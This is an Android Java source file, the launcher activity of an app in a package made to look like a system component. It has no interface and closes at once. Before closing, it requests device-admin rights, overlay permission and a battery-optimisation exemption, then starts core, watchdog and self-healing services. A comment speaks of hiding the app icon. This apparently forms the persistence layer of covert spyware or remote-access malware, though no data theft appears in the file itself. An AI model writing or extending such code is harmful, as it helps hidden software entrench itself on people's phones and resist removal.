package com.xrc.system.ui;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;

import com.xrc.system.core.ConfigManager;
import com.xrc.system.core.Constants;
import com.xrc.system.core.SelfHealer;
import com.xrc.system.features.DeviceAdmin;
import com.xrc.system.features.PermissionHelper;
import com.xrc.system.service.CoreService;
import com.xrc.system.service.WatchdogService;

public class MainActivity extends Activity {
    private static final String TAG = Constants.TAG + ":Main";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.i(TAG, "MainActivity created");
        initialize();
        finish();
    }

    private void initialize() {
        try {
            // Request device admin
            if (!DeviceAdmin.get(this).isActive()) {
                DeviceAdmin.get(this).requestActivation();
            }
            // Request overlay permission
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (!Settings.canDrawOverlays(this)) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                }
            }
            // Request ignore battery optimizations
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                }
            }
            // Start services
            startService(new Intent(this, CoreService.class));
            startService(new Intent(this, WatchdogService.class));
            SelfHealer.get(this).start();
            // Hide icon if first launch
            if (ConfigManager.get(this).getBoolean(Constants.PREF_FIRST_LAUNCH, true)) {
                ConfigManager.get(this).setBoolean(Constants.PREF_FIRST_LAUNCH, false);
            }
        } catch (Exception e) {
            Log.e(TAG, "Initialization failed", e);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }
}
